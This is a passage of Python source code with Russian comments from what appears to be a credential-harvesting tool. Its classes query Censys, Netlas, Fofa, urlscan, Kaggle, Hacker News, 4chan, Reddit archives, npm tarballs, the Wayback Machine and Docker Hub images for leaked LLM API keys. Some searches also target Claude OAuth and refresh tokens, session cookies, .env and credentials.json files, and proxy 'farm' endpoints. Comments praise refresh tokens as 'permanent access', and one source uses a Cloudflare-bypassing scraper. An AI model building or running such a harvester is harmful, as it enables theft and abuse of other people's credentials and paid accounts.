                plain = _html.unescape(re.sub(r"<[^>]+>", "", snip))
                if "baseten" in plain.lower() and self.K832.search(plain):
                    out.append((plain, "baseten-grep:%s/%s" % (repo, path)))
                if repo and path:
                    try:
                        raw = "https://raw.githubusercontent.com/%s/%s/%s" % (
                            repo,
                            branch,
                            path,
                        )
                        rr = http("GET", raw, timeout=(5, 12))
                        if rr.status_code == 200 and "baseten" in rr.text.lower():
                            out.append(
                                (rr.text[:400_000], "baseten-grep:%s/%s" % (repo, path))
                            )
                    except Exception:
                        continue
        except Exception:
            pass
        return out

    def fetch(self):
        out = []
        deadline = time.time() + 180
        try:
            out.extend(self._grepapp())
        except Exception:
            pass
        try:
            out.extend(self._docker(deadline))
        except Exception:
            pass
        if out:
            log("  [baseten-hunter] %d чанков" % len(out))
        return out


class Fofa(Source):
    name = "fofa"

    def fetch(self):
        if not (CFG["fofa_email"] and CFG["fofa_key"]):
            return []
        out = []
        import base64 as b64

        for q in CFG["fofa_queries"]:
            try:
                # urlsafe + urlquote: голый base64 содержит +/- и падает в
                # query-string (было: ~1/3 запросов портится на сервере)
                qb = urlquote(b64.urlsafe_b64encode(q.encode()).decode())
                r = http(
                    "GET",
                    "https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=50"
                    % (urlquote(CFG["fofa_email"]), CFG["fofa_key"], qb),
                    timeout=(10, 25),
                )
                if r.status_code != 200:
                    continue
                for res in (r.json().get("results") or [])[:50]:
                    if isinstance(res, list) and len(res) >= 2:
                        host = res[0]
                        # fofa отдаёт host УЖЕ со схемой для веб-сервисов
                        # (было: "https://https://1.2.3.4" -> InvalidURL)
                        if str(host).startswith(("http://", "https://")):
                            candidates = [host]
                        else:
                            candidates = ["https://" + host, "http://" + host]
                        for u in candidates:
                            try:
                                t, _ = fetch_text(u, (6, 12), 400_000)
                                if t:
                                    out.append((t, "fofa:" + u))
                                    break  # схема сработала — вторую не дёргаем
                            except Exception:
                                continue
            except Exception:
                continue
        return out


class Feeds(Source):
    """Кастомные URL + tg_channels (t.me/s/<канал> — серверный HTML с постами)."""

    name = "feeds"

    def fetch(self):
        urls = []
        for ch in CFG.get("tg_channels", []):
            urls.append("https://t.me/s/%s" % ch.lstrip("@"))
        # P0.1: конфиг-регрессия — feeds может прийти ОДНОЙ строкой через пробел
        # (итерация по строке давала посимвольные "URL" -> MissingSchema на всех)
        raw = CFG.get("feeds", [])
        if isinstance(raw, str):
            raw = raw.split()
        urls += [f if isinstance(f, str) else f.get("url", "") for f in raw]
        out = []
        for u in [u for u in urls if u]:
            try:
                t, _ = fetch_text(u, (8, 20), 900_000)
                if t:
                    # t.me/s: уберём html, но ключи в тексте
                    plain = htmllib.unescape(re.sub(r"<[^>]+>", " ", t))
                    out.append((t if "t.me" not in u else plain, u))
            except Exception:
                continue
        return out


class LocalFiles(Source):
    name = "local"

    def __init__(self, paths):
        self.paths = paths
        LocalFiles.name = "local:%s" % ",".join(p[:28] for p in paths[:2])

    def fetch(self):
        out = []
        for p in self.paths:
            if os.path.isdir(p):
                for root, _, files in os.walk(p):
                    for fn in files:
                        if fn.endswith(
                            (
                                ".html",
                                ".txt",
                                ".json",
                                ".jsonl",
                                ".md",
                                ".log",
                                ".env",
                                ".yml",
                                ".yaml",
                                ".py",
                                ".js",
                            )
                        ):
                            fp = os.path.join(root, fn)
                            try:
                                # getsize ВНУТРИ try (было: файл пропал между
                                # walk и getsize = весь fetch падает)
                                if os.path.getsize(fp) > 50_000_000:
                                    continue
                                with open(fp, encoding="utf-8", errors="replace") as fh:
                                    out.append((fh.read(), fp))
                            except Exception:
                                continue
            elif os.path.exists(p):
                try:
                    with open(p, encoding="utf-8", errors="replace") as fh:
                        out.append((fh.read(), p))
                except Exception:
                    continue
        return out


class URLScan(Source):
    """urlscan.io: сканы сайтов — DOM-содержимое relay-панелей, .env, JS с ключами."""

    name = "urlscan"

    def fetch(self):
        if not CFG.get("urlscan_key"):
            return []
        out = []
        headers = {"API-Key": CFG["urlscan_key"], "Accept": "application/json"}
        # запросы: relay-домены из relay_boards.json + дженерики
        domains = []
        try:
            with open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8") as f:
                domains = [r.get("domain") for r in json.load(f) if r.get("domain")]
        except Exception:
            pass
        # АУДИТ-фикс: domains[:10] — фиксированное окно; ротация по 15 мин,
        # иначе релеи за первой десяткой никогда не сканировались
        if len(domains) > 10:
            _rot = int(time.time() // 900)
            _st = (_rot * 10) % len(domains)
            domains = [domains[(_st + i) % len(domains)] for i in range(10)]
        queries = ["page.url:%s" % d for d in domains]
        queries += [
            "page.url:*.top AND page.url:console",
            "page.url:*.top AND page.url:token",
            "page.url:*.ccwu.cc",
            "page.url:*.info AND page.url:api",
            # подписочные файлы, отданные веб-серверами (urlscan видит DOM/ресурсы)
            "filename:credentials.json",
            "filename:claude.json",
            "filename:.env",
        ]
        seen_uuids = set()
        for q in queries:
            try:
                r = http(
                    "GET",
                    "https://urlscan.io/api/v1/search/?q=%s&size=10" % urlquote(q),
                    timeout=(10, 30),
                    headers=headers,
                )
                if r.status_code != 200:
                    continue
                for res in (r.json().get("results") or [])[:10]:
                    uuid = res.get("_id")
                    page_url = (res.get("page") or {}).get("url", uuid)
                    if not uuid or uuid in seen_uuids:
                        continue
                    seen_uuids.add(uuid)
                    # DOM через /dom/{uuid}/ (HTML целиком — там ключи)
                    try:
                        r2 = http(
                            "GET",
                            "https://urlscan.io/dom/%s/" % uuid,
                            timeout=(10, 40),
                            headers={"API-Key": CFG["urlscan_key"]},
                        )
                        if (
                            r2 is not None
                            and r2.status_code == 200
                            and len(r2.text or "") > 100
                        ):
                            out.append((r2.text, "urlscan:%s" % page_url))
                        r2.close() if hasattr(r2, "close") else None
                    except Exception:
                        continue
                    # result-JSON: тела ПОДРЕСУРСОВ (js/.env/json) — ключи живут
                    # там, DOM их не содержит (было: не тянули вообще)
                    try:
                        r3 = http(
                            "GET",
                            "https://urlscan.io/api/v1/result/%s/" % uuid,
                            timeout=(10, 40),
                            headers={"API-Key": CFG["urlscan_key"]},
                        )
                        if r3 is not None and r3.status_code == 200:
                            reqs = ((r3.json().get("data") or {}).get("requests")) or []
                            for req in reqs[:40]:
                                resp = req.get("response") or {}
                                # мелкие текстовые ответы — кандидаты на ключи
                                body = resp.get("body") or ""
                                if (
                                    body
                                    and len(body) < 800_000
                                    and any(
                                        m in body
                                        for m in (
                                            "sk-",
                                            "AIza",
                                            "api_key",
                                            "API_KEY",
                                            "oat01",
                                            "Bearer ",
                                        )
                                    )
                                ):
                                    out.append(
                                        (
                                            body[:800_000],
                                            "urlscan-res:%s"
                                            % str(
                                                req.get("request", {}).get(
                                                    "url", page_url
                                                )
                                            )[:120],
                                        )
                                    )
                    except Exception:
                        pass
            except Exception:
                continue
        return out


class Kaggle(Source):
    """Kaggle kernels: ноутбуки с хардкод-ключами (LLM-компетишены/туториалы)."""

    name = "kaggle"

    def _get(self, url, timeout=(12, 25)):
        # Kaggle блокирует через прокси-IP (recaptcha) — только direct
        try:
            return DIRECT.get(
                url,
                headers={
                    "Authorization": "Bearer " + CFG.get("kaggle_token", ""),
                    "Accept": "application/json",
                    "User-Agent": UA["User-Agent"],
                },
                timeout=timeout,
                verify=False,
            )
        except Exception:
            return None

    def fetch(self):
        if not CFG.get("kaggle_token"):
            return []
        out = []
        import time as _t

        for q in (
            "claude api",
            "deepseek api",
            "openai api",
            "llm api",
            "gemini api",
            "anthropic",
            "llm proxy",
        ):
            for attempt in range(2):  # recaptcha флапает — ретрай с паузой
                try:
                    r = self._get(
                        "https://www.kaggle.com/api/v1/kernels/list?search=%s"
                        "&sortBy=dateRun&pageSize=15" % urlquote(q)
                    )
                    if r is None or r.status_code != 200:
                        _t.sleep(3)
                        continue
                    ct = r.headers.get("Content-Type", "")
                    if "json" not in ct:
                        _t.sleep(5)  # recaptcha-страница — ждём
                        continue
                    for k in r.json()[:15]:
                        ref = k.get("ref") or ""
                        if not ref or "/" not in ref:
                            continue
                        user, slug = ref.split("/", 1)
                        try:
                            r2 = self._get(
                                "https://www.kaggle.com/api/v1/kernels/pull"
                                "?userName=%s&kernelSlug=%s" % (user, slug)
                            )
                            if (
                                r2 is not None
                                and r2.status_code == 200
                                and "json" in r2.headers.get("Content-Type", "")
                            ):
                                out.append((r2.text, "kaggle:%s" % ref))
                        except Exception:
                            continue
                    break  # успех — к следующему запросу
                except Exception:
                    continue
            _t.sleep(2)
        return out


class Censys(Source):
    """Censys Platform API v3 (api.platform.censys.io) — ТРЕТИЙ независимый краулер.
    Free-тир: host-lookup по IP (как Netlas) — все порты/сервисы фермы из их индекса.
    Новые (ip,port) -> censys_endpoints.json -> cc_proxy_sweep пробит (проб бесплатный).
    Пат: censys_... из Personal Access Tokens. Лимит free: 1 concurrent, ~секунда/запрос."""

    name = "censys"
    ENDPOINTS_PATH = os.path.join(HERE, "censys_endpoints.json")
    POOLS = [
        r"C:\Temp\opencode\all_setup_hosts.json",
        r"C:\Temp\opencode\farm_open.json",
    ]
    PER_CYCLE = 8  # IP за цикл (free: 1 concurrent — идём последовательно)

    def _farm_ips(self):
        ips = []
        for p in self.POOLS:
            try:
                for h in json.load(open(p, encoding="utf-8")):
                    m = re.match(r"^(\d+\.\d+\.\d+\.\d+):\d+$", str(h))
                    if m:
                        ips.append(m.group(1))
            except Exception:
                continue
        return list(dict.fromkeys(ips))

    def fetch(self):
        # 1) классическая пара (если вдруг есть) — поиск по body
        if CFG.get("censys_id") and CFG.get("censys_secret"):
            return self._fetch_idsec(CFG["censys_id"], CFG["censys_secret"])
        # 2) платформенный PAT — host-lookup ферм
        key = CFG.get("censys_key") or CFG.get("censys_secret")
        if not key or not str(key).startswith("censys_"):
            return []
        return self._fetch_platform(key)

    def _fetch_platform(self, key):
        ips = self._farm_ips()
        if not ips:
            return []
        try:
            cursor = json.load(
                open(os.path.join(HERE, "censys_cursor.json"), encoding="utf-8")
            )
        except Exception:
            cursor = {"i": 0}
        batch = [
            ips[(cursor.get("i", 0) + j) % len(ips)] for j in range(self.PER_CYCLE)
        ]
        cursor["i"] = cursor.get("i", 0) + self.PER_CYCLE
        try:
            json.dump(
                cursor,
                open(os.path.join(HERE, "censys_cursor.json"), "w", encoding="utf-8"),
            )
        except Exception:
            pass

        endpoints = {}
        try:
            endpoints = json.load(open(self.ENDPOINTS_PATH, encoding="utf-8"))
        except Exception:
            pass

        H = {
            "Authorization": "Bearer " + key,
            "Accept": "application/vnd.censys.api.v3.host.v1+json",
        }
        out = []
        new_eps = 0
        for ip in batch:
            try:
                r = self._cg(
                    "https://api.platform.censys.io/v3/global/asset/host/" + ip,
                    headers=H,
                )
                if r is None or r.status_code != 200:
                    continue
                res = r.json().get("result", {}).get("resource", {})
                for svc in res.get("services") or []:
                    port = svc.get("port")
                    if not port:
                        continue
                    addr = "%s:%s" % (ip, port)
                    # тело HTTP-сервиса (если есть) — в чанки на извлечение ключей
                    # (было: http-переменная шла строкой-дампом всего dict)
                    http_svc = svc.get("http") or {}
                    resp = http_svc.get("response") or {}
                    if isinstance(resp, str):
                        body = resp  # бывает готовой строкой
                    else:
                        body = str(resp.get("body") or resp.get("html") or "")
                    if body and body != "{}":
                        out.append((body, "censys:%s" % addr))
                    if port and addr not in endpoints:
                        endpoints[addr] = {"ts": time.time(), "src": "censys"}
                        new_eps += 1
            except Exception:
                continue
            time.sleep(1.2)  # free: 1 concurrent
        if endpoints:
            try:
                json.dump(
                    endpoints,
                    open(self.ENDPOINTS_PATH, "w", encoding="utf-8"),
                    indent=1,
                    ensure_ascii=False,
                )
            except Exception:
                pass
        if out or new_eps:
            log(
                "  [censys] %d IP lookup, +%d новых эндпоинтов, %d тел"
                % (len(batch), new_eps, len(out))
            )
        return out

    def _cg(self, url, headers=None, timeout=(15, 40)):
        try:
            import cloudscraper

            s = cloudscraper.create_scraper(
                browser={"browser": "chrome", "platform": "windows", "desktop": True}
            )
            return s.get(url, headers=headers or {}, timeout=timeout)
        except Exception:
            return None

    def _fetch_idsec(self, cid, csec):
        import base64 as b64

        out = []
        auth = "Basic " + b64.b64encode(("%s:%s" % (cid, csec)).encode()).decode()
        for q in (
            'services.http.response.html:"sk-ant-api03"',
            'services.http.response.html:"sk-proj-"',
            'services.http.response.html:"OPENAI_API_KEY"',
            # CC-прокси ФЕРМЫ (Max-слоты!)
            'services.http.response.html:"setup_token"',
            # OAuth токены Claude (подписки!)
            'services.http.response.html:"sk-ant-oat01"',
            'services.http.response.html:"claudeAiOauth"',
            # refresh-токены = перманентный доступ
            'services.http.response.html:"sk-ant-ort01"',
            # неординарно: credentials.json/куки/сессии
            'services.http.response.html:"oauthAccount"',
            'services.http.response.html:"sk-ant-sid01"',
            # relay-панели с балансом
            'services.http.response.html:"new-api"',
            'services.http.response.html:"one-api"',
        ):
            try:
                r = self._cg(
                    "https://search.censys.io/api/v2/hosts/search?q=%s&per_page=50"
                    % urlquote(q),
                    headers={"Authorization": auth, "Accept": "application/json"},
                )
                if r is None or r.status_code != 200:
                    continue
                j = r.json()
                for hit in (j.get("result", {}).get("hits") or [])[:50]:
                    svc = hit.get("services") or [{}]
                    for s in svc[:3]:
                        html_txt = str(
                            (s.get("http", {}) or {}).get("response", {}) or ""
                        )
                        if html_txt:
                            out.append((html_txt, "censys:%s" % hit.get("ip")))
            except Exception:
                continue
        return out

    def _fetch_key(self, key):
        # платформенный ключ: пробуем варианты (может не сработать — тогда лог)
        out = []
        for hdr in ({"Authorization": "Bearer " + key}, {"X-Api-Key": key}):
            try:
                r = self._cg(
                    "https://search.censys.io/api/v2/hosts/search"
                    "?q=service.port%3A443&per_page=1",
                    headers=dict(hdr, Accept="application/json"),
                )
                if r is not None and r.status_code == 200:
                    # ключ таки работает! делаем реальные запросы
                    for q in (
                        'services.http.response.html:"sk-ant-api03"',
                        'services.http.response.html:"sk-proj-"',
                    ):
                        rr = self._cg(
                            "https://search.censys.io/api/v2/hosts/search?q=%s&per_page=50"
                            % urlquote(q),
                            headers=dict(hdr, Accept="application/json"),
                        )
                        if rr is None or rr.status_code != 200:
                            continue
                        for hit in (rr.json().get("result", {}).get("hits") or [])[:50]:
                            for s in (hit.get("services") or [{}])[:3]:
                                t = str(
                                    (s.get("http", {}) or {}).get("response", {}) or ""
                                )
                                if t:
                                    out.append((t, "censys:%s" % hit.get("ip")))
                    return out
            except Exception:
                continue
        log(
            "  [censys] ключ censys_… не принят Search v2 (нужна пара ID+Secret "
            "из https://search.censys.io/account/api)"
        )
        return out


class Netlas(Source):
    """Netlas.io — ВТОРОЙ независимый краулер (другое покрытие чем Shodan!).
    Free-тариф: только IP-запросы (50/день) — обходим фермы CC-прокси по IP,
    вытаскиваем ВСЕ порты + тела (setup_token!). Эндпоинты пишутся в
    netlas_endpoints.json -> их пробит cc_proxy_sweep (проб бесплатный)."""

    name = "netlas"
    STATE_PATH = os.path.join(HERE, "netlas_state.json")
    ENDPOINTS_PATH = os.path.join(HERE, "netlas_endpoints.json")
    POOLS = [
        r"C:\Temp\opencode\all_setup_hosts.json",
        r"C:\Temp\opencode\farm_open.json",
    ]
    DAILY_CAP = 46  # запас от лимита 50
    PER_CYCLE = 6  # IP за цикл

    def _state(self):
        try:
            return json.load(open(self.STATE_PATH, encoding="utf-8"))
        except Exception:
            return {"day": "", "used": 0, "ip_cursor": 0}

    def _save_state(self, st):
        try:
            _atomic_json_dump(self.STATE_PATH, st)
        except Exception:
            pass

    def _farm_ips(self):
        ips = []
        for p in self.POOLS:
            try:
                for h in json.load(open(p, encoding="utf-8")):
                    m = re.match(r"^(\d+\.\d+\.\d+\.\d+):\d+$", str(h))
                    if m:
                        ips.append(m.group(1))
            except Exception:
                continue
        return list(dict.fromkeys(ips))

    def fetch(self):
        key = CFG.get("netlas_key")
        if not key:
            return []
        today = time.strftime("%Y-%m-%d")
        st = self._state()
        if st.get("day") != today:
            st = {"day": today, "used": 0, "ip_cursor": st.get("ip_cursor", 0)}
        if st.get("used", 99) >= self.DAILY_CAP:
            return []

        farm_ips = self._farm_ips()
        if not farm_ips:
            return []
        cursor = st.get("ip_cursor", 0) % len(farm_ips)
        batch = [farm_ips[(cursor + i) % len(farm_ips)] for i in range(self.PER_CYCLE)]
        st["ip_cursor"] = cursor + self.PER_CYCLE

        endpoints = {}
        try:
            endpoints = json.load(open(self.ENDPOINTS_PATH, encoding="utf-8"))
        except Exception:
            pass

        out = []
        sess = requests.Session()
        sess.trust_env = False
        for ip in batch:
            if st["used"] >= self.DAILY_CAP:
                break
            try:
                r = sess.get(
                    "https://app.netlas.io/api/responses/",
                    params={"q": "ip:" + ip, "start": 0, "fields": "*"},
                    headers={"X-API-Key": key},
                    timeout=(12, 30),
                    verify=False,
                )
                # бюджет считаем ТОЛЬКО по успешным ответам (было: 429/5xx
                # сжигали дневной кап 46 — при пустом результате в остаток дня)
                if r.status_code == 200:
                    st["used"] += 1
                elif r.status_code == 429:
                    # АУДИТ-фикс: раньше sleep(2) и ДАЛЬШЕ по IP в разнос —
                    # вторичный rate-limit только крепчал. Стопаем источник
                    # до следующего цикла.
                    log("  [netlas] 429 rate-limit — стоп до след. цикла")
                    break
                if r.status_code != 200:
                    continue
                items = r.json().get("items") or []
                for it in items:
                    data = it.get("data") or {}
                    port = data.get("port")
                    if not port:
                        continue
                    body = str((data.get("http") or {}).get("body") or "")
                    if not body:
                        continue
                    addr = "%s:%s" % (ip, port)
                    out.append((body, "netlas:%s" % addr))
                    # cc-sweep-эндпоинт: ЛЮБОЙ отвечающий порт (было: только
                    # с setup_token — большинство портов не доходило до файла)
                    if addr not in endpoints:
                        endpoints[addr] = {
                            "ts": time.time(),
                            "body": body[:500],
                        }
                time.sleep(1)  # free-tier ~1rps
            except Exception:
                continue

        self._save_state(st)
        if endpoints:
            try:
                json.dump(
                    endpoints,
                    open(self.ENDPOINTS_PATH, "w", encoding="utf-8"),
                    indent=1,
                    ensure_ascii=False,
                )
            except Exception:
                pass
        if out:
            log(
                "  [netlas] %d IP опрошено (бюджет %d/%d), тел=%d, эндпоинтов всего=%d"
                % (len(batch), st["used"], self.DAILY_CAP, len(out), len(endpoints))
            )
        return out


class HNAlgolia(Source):
    """Hacker News (Algolia API): комменты с утёкшими ключами и 'free endpoint' постами."""

    name = "hn"

    def fetch(self):
        out = []
        for q in (
            '"sk-ant-api03"',
            '"api key" claude leak',
            "claude api free",
            '"free api key" llm',
            "gpt proxy free",
            "llm relay key",
        ):
            try:
                r = http(
                    "GET",
                    "https://hn.algolia.com/api/v1/search_by_date?query=%s&tags=comment&hitsPerPage=30"
                    % urlquote(q),
                    timeout=(8, 15),
                )
                if r.status_code != 200:
                    continue
                for hit in r.json().get("hits", [])[:30]:
                    txt = hit.get("comment_text") or hit.get("story_text") or ""
                    if txt and len(txt) > 30:
                        out.append((txt, "hn:%s" % hit.get("objectID")))
            except Exception:
                continue
        return out


class FourChan(Source):
    """4chan /g/: JSON API. Сканим ВСЕ свежие треды (subject почти всегда пуст — фильтр по нему не работает)."""

    name = "4chan"

    BOARDS = ("g", "sci")  # g + sci = LLM-heavy boards

    def fetch(self):
        out = []
        for board in self.BOARDS:
            try:
                r = http(
                    "GET", "https://a.4cdn.org/%s/threads.json" % board, timeout=(8, 15)
                )
                if r.status_code != 200:
                    continue
                threads = [t for page in r.json()[:2] for t in page.get("threads", [])]
                for t in threads[:25]:  # топ-25 свежих тредов без фильтра
                    no = t.get("no")
                    if not no:
                        continue
                    try:
                        r2 = http(
                            "GET",
                            "https://a.4cdn.org/%s/thread/%d.json" % (board, no),
                            timeout=(8, 15),
                        )
                        if r2.status_code == 200:
                            posts = r2.json().get("posts", [])
                            for p in posts[:100]:
                                com = p.get("com") or ""
                                if com:
                                    txt = htmllib.unescape(re.sub(r"<[^>]+>", " ", com))
                                    if len(txt) > 30:
                                        out.append((txt, "4chan:/%s/%d" % (board, no)))
                        time.sleep(1)  # 4cdn: 1 rps иначе cloudflare-ban
                    except Exception:
                        continue
            except Exception:
                continue
        return out


class PullPush(Source):
    """PullPush.io — архив Reddit (бесплатный API, без авторизации).
    Сабмишены+комменты с 'claude api key', 'sk-ant' и relay-раздачами.
    ВАЖНО: жёсткий rate-limit — троттлим 3.5с + ротация 3 запроса/цикл + 429-выход."""

    name = "pullpush-reddit"

    SUBS = (
        "LocalLLaMA",
        "OpenAI",
        "ClaudeAI",
        "ChatGPTPro",
        "StableDiffusion",
        "singularity",
        "ArtificialInteligence",
        "opensource",
    )

    _rot = 0  # ротация запросов между циклами
    _rot_sub = 0  # независимая ротация сабов (было: та же rot % 6 — из 8
    # сабов опрашивались только 4: rot всегда 0/3 -> SUBS[2],[5],[6],[7] мёртвы)

    QUERIES = (
        '"sk-ant-api03"',
        '"claude api key"',
        '"free api key" llm',
        "llm relay free",
        '"api key" deepseek',
        "gpt proxy key",
    )

    def fetch(self):
        out = []
        # 3 запроса за цикл (ротация) — анти-rate-limit
        rot = PullPush._rot
        PullPush._rot = (rot + 3) % len(self.QUERIES)
        qbatch = [self.QUERIES[(rot + i) % len(self.QUERIES)] for i in range(3)]
        # 2 саба за цикл — СВОЯ ротация (шаг +2, взаимно простой с len)
        srot = PullPush._rot_sub
        PullPush._rot_sub = (srot + 2) % len(self.SUBS)
        sub_batch = [self.SUBS[(srot + i) % len(self.SUBS)] for i in range(2)]
        try:
            for q in qbatch:
                for kind in ("submission", "comment"):
                    try:
                        r = http(
                            "GET",
                            "https://api.pullpush.io/reddit/search/%s/?q=%s&size=25"
                            % (kind, urlquote(q)),
                            timeout=(12, 25),
                        )
                        if r is None:
                            continue
                        if r.status_code == 429:
                            # rate limit: стоп + бэкофф на 6 циклов
                            try:
                                mark_rate_limited(self.name, backoff_cycles=6)
                            except Exception:
                                pass
                            return out
                        if r.status_code == 200:
                            for d in r.json().get("data", [])[:25]:
                                txt = (
                                    (d.get("selftext") or "")
                                    + "\n"
                                    + (d.get("body") or "")
                                    + "\n"
                                    + (d.get("title") or "")
                                )
                                if len(txt) > 40:
                                    out.append((txt, "reddit:%s" % d.get("id")))
                    except Exception:
                        continue
                    time.sleep(3.5)  # троттлинг между запросами
            # свежие посты из LLM-сабов (ротация)
            for sub in sub_batch:
                try:
                    r = http(
                        "GET",
                        "https://api.pullpush.io/reddit/search/submission/?subreddit=%s&size=25"
                        % sub,
                        timeout=(12, 25),
                    )
                    if r is not None and r.status_code == 429:
                        try:
                            mark_rate_limited(self.name, backoff_cycles=6)
                        except Exception:
                            pass
                        return out
                    if r is not None and r.status_code == 200:
                        for d in r.json().get("data", [])[:25]:
                            txt = (
                                (d.get("selftext") or "")
                                + "\n"
                                + (d.get("title") or "")
                            )
                            if len(txt) > 60:
                                out.append((txt, "reddit:%s/%s" % (sub, d.get("id"))))
                except Exception:
                    continue
                time.sleep(3.5)
        except Exception:
            pass
        return out


class NpmRegistry(Source):
    """npm-registry: пакеты-прокси/тулкиты часто содержат хардкод-ключи.
    Скачиваем tarball популярных llm-proxy/ai-gateway пакетов и греппим."""

    name = "npm"

    QUERIES = (
        "keywords:openai-proxy",
        "keywords:llm-proxy",
        "keywords:ai-gateway",
        "keywords:claude-api",
        "keywords:llm-router",
        "openai api key",
        "claude proxy api",
    )

    def fetch(self):
        out = []
        pkgs = []
        for q in self.QUERIES:
            try:
                r = http(
                    "GET",
                    "https://registry.npmjs.org/-/v1/search?text=%s&size=15"
                    % urlquote(q),
                    timeout=(8, 15),
                )
                if r.status_code != 200:
                    continue
                for o in r.json().get("objects", [])[:15]:
                    name = (o.get("package") or {}).get("name")
                    if name and name not in pkgs:
                        pkgs.append(name)
            except Exception:
                continue
        # качаем tarball каждого пакета (последняя версия)
        import tarfile, io

        for name in pkgs[:30]:
            try:
                # scoped пакеты: @scope/pkg -> %2f (было: сырой слеш = 404,
                # весь scoped-класс молча пропадал)
                r = http(
                    "GET",
                    "https://registry.npmjs.org/%s" % name.replace("/", "%2f"),
                    timeout=(8, 15),
                )
                if r.status_code != 200:
                    continue
                j = r.json()
                ver = j.get("dist-tags", {}).get("latest")
                tarball = (
                    (j.get("versions", {}).get(ver, {}) or {})
                    .get("dist", {})
                    .get("tarball")
                )
                if not tarball:
                    continue
                r2 = http("GET", tarball, timeout=(10, 25))
                if r2 is None or r2.status_code != 200:
                    continue
                # распаковываем .js/.json/.env файлы и греппим
                buf = io.BytesIO(r2.content)
                try:
                    with tarfile.open(fileobj=buf, mode="r:gz") as tf:
                        for member in tf.getmembers()[:40]:
                            if member.name.endswith(
                                (".js", ".json", ".env", ".md", ".ts")
                            ):
                                fdata = tf.extractfile(member)
                                if fdata and member.size < 200_000:
                                    try:
                                        content = fdata.read().decode(
                                            "utf-8", "replace"
                                        )
                                        if any(
                                            k in content
                                            for k in (
                                                "sk-",
                                                "api_key",
                                                "apiKey",
                                                "API_KEY",
                                            )
                                        ):
                                            out.append(
                                                (
                                                    content,
                                                    "npm:%s/%s" % (name, member.name),
                                                )
                                            )
                                    except Exception:
                                        continue
                except Exception:
                    continue
            except Exception:
                continue
        return out


class WaybackHunt(Source):
    """Wayback Machine: .env/config/dump-файлы relay-доменов в веб-архиве."""

    name = "wayback"

    INTERESTING = (
        ".env",
        "config",
        "backup",
        "dump",
        "token",
        "secret",
        "key",
        "setting",
        "database",
        "sql",
        "api",
    )

    def fetch(self):
        out = []
        # домены релеев из relay_boards.json + конфига
        doms = []
        try:
            with open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8") as f:
                for r in json.load(f):
                    d = r.get("domain")
                    if d:
                        doms.append(d)
        except Exception:
            pass
        # АУДИТ-фикс: было doms[:15] — новые релеи (файл дополняется
        # append'ом) никогда не попадали в окно. Вращаем по 15 мин.
        if len(doms) > 15:
            _rot = int(time.time() // 900)
            _st = (_rot * 15) % len(doms)
            doms = [doms[(_st + i) % len(doms)] for i in range(15)]
        for dom in doms:
            try:
                r = http(
                    "GET",
                    "https://web.archive.org/cdx/search/cdx?url=%s/*&output=json&limit=100&filter=statuscode:200&collapse=urlkey"
                    % dom,
                    timeout=(15, 60),
                )
                if r is None or r.status_code != 200:
                    continue
                rows = json.loads(r.text)
                if not rows or len(rows) < 2:
                    continue
                for row in rows[1:]:
                    # CDX поля: urlkey, timestamp, original, ... — URL это [2],
                    # а [1] это timestamp (было перепутано -> источник молчал)
                    ts_snap = row[1] if len(row) > 1 else "2026"
                    url = row[2] if len(row) > 2 else ""
                    if any(k in url.lower() for k in self.INTERESTING):
                        # тянем архивную копию (реальный timestamp снапшота)
                        try:
                            t, _ = fetch_text(
                                "https://web.archive.org/web/%s/%s" % (ts_snap, url),
                                (10, 30),
                                400_000,
                            )
                            if t:
                                out.append((t, "wayback:%s" % url))
                        except Exception:
                            continue
            except Exception:
                continue
        return out


class DockerHub(Source):
    """Docker Hub: ENV-ключи в config-blob образов + build-args в history.
    Протокол: search API (anon) -> per-repo token -> OCI index -> amd64 manifest
    -> config blob."""

    name = "dockerhub"

    QUERIES = (
        "new-api",
        "one-api",
        "openai proxy",
        "llm proxy",
        "chatgpt",
        "ai-gateway",
        "gpt proxy",
        "claude",
        "free-api",
        "api-proxy",
    )

    ACCEPT = ", ".join(
        [
            "application/vnd.oci.image.index.v1+json",
            "application/vnd.oci.image.manifest.v1+json",
            "application/vnd.docker.distribution.manifest.list.v2+json",
            "application/vnd.docker.distribution.manifest.v2+json",
        ]
    )

    def fetch(self):
        self._out = []
        self._lock = threading.RLock()
        repos = []
        for q in self.QUERIES:
            try:
                r = http(
                    "GET",
                    "https://hub.docker.com/v2/search/repositories/?query=%s&page_size=15"
                    % urlquote(q),
                    timeout=(8, 15),
                )
                if r.status_code != 200:
                    continue
                for item in (r.json().get("results") or [])[:15]:
                    repo = item.get("repo_name")
                    if repo and repo not in repos:
                        repos.append(repo)
            except Exception:
                continue
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            futs = [ex.submit(self._scan_repo, repo) for repo in repos[:25]]
            for f in concurrent.futures.as_completed(futs):
                try:
                    f.result(timeout=90)
                except Exception:
                    continue
        return self._out

    def _token(self, repo):
        # official images без неймспейса -> library/<name> (было: token 401 /
        # manifest 404, весь класс официальных образов молча пропадал)
        if "/" not in repo:
            repo = "library/" + repo
        try:
            r = http(
                "GET",
                "https://auth.docker.io/token?service=registry.docker.io"
                "&scope=repository:%s:pull" % repo,
                timeout=(8, 15),
            )
            if r.status_code == 200:
                return r.json().get("token")
        except Exception:
            pass
        return None

    def _scan_repo(self, repo):
        try:
            tok = self._token(repo)
            if not tok:
                return
            hdr = {"Authorization": "Bearer " + tok, "Accept": self.ACCEPT}
            r = http(
                "GET",
                "https://registry-1.docker.io/v2/%s/manifests/latest" % repo,
                timeout=(10, 25),
                headers=hdr,
            )
            if r is None or r.status_code != 200:
                return
            try:
                man = r.json()
            except Exception:
                return
            if man.get("manifests"):  # OCI index -> amd64
                amd = next(
                    (
                        m
                        for m in man["manifests"]
                        if (m.get("platform") or {}).get("architecture") == "amd64"
                    ),
                    man["manifests"][0],
                )
                dig = amd.get("digest")
                if not dig:
                    return
                r2 = http(
                    "GET",
                    "https://registry-1.docker.io/v2/%s/manifests/%s" % (repo, dig),
                    timeout=(10, 25),
                    headers=hdr,
                )
                if r2 is None or r2.status_code != 200:
                    return
                try:
                    m2 = r2.json()
                except Exception:
                    return
                cfg = (m2.get("config") or {}).get("digest")
            else:
                cfg = (man.get("config") or {}).get("digest")
            if cfg:
                self._pull_config(repo, tok, cfg)
        except Exception:
            return

    def _pull_config(self, repo, tok, cfg_digest):
        try:
            r = http(
                "GET",
                "https://registry-1.docker.io/v2/%s/blobs/%s" % (repo, cfg_digest),
                timeout=(10, 30),
                headers={"Authorization": "Bearer " + tok},
            )
            if r is None or r.status_code != 200:
                return
            cfg = r.json()
